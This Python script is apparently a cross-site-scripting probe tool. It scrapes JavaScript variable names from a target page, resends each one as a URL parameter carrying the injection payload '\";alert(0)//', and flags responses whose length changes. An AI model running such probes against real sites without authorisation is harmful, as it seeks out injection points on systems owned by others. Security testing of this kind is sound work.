import requests
import sys
import regex as re
import pandas as pd

regex_pattern = r'(?:var|let) ([a-zA-Z0-9_]+)'
payload = "\";alert(0)//"
interesting_urls = []


def send_request(url, param, original_content_length):
    request_url = url + "?" + param + "=" + payload
    res = requests.get(url + "?" + param + "=" + payload, headers={'Accept-Encoding': None})
    try:
        current_content_length = res.headers['Content-Length']
    except:
        current_content_length = len(res.text)

    print(f'[Response {res.status_code}, {original_content_length}, {current_content_length}]', request_url)
    if original_content_length != current_content_length and res.status_code != 403:
        interesting_urls.append(request_url)


def main(url):
    res = requests.get(url, headers={'Accept-Encoding': None})
    try:
        original_content_length = res.headers['Content-Length']
    except:
        original_content_length = len(res.text)

    regexp = re.compile(regex_pattern)
    response_text = res.text
    matches = regexp.findall(response_text)
    df = pd.DataFrame(matches, columns=['parameter'])
    df = df.drop_duplicates()
    df.apply(lambda row: send_request(url, row['parameter'], original_content_length), axis=1)
    if len(interesting_urls) > 0:
        for url in interesting_urls:
            print(url)
    else:
        print("No interesting URL found")


if __name__ == "__main__":
    main(sys.argv[1])
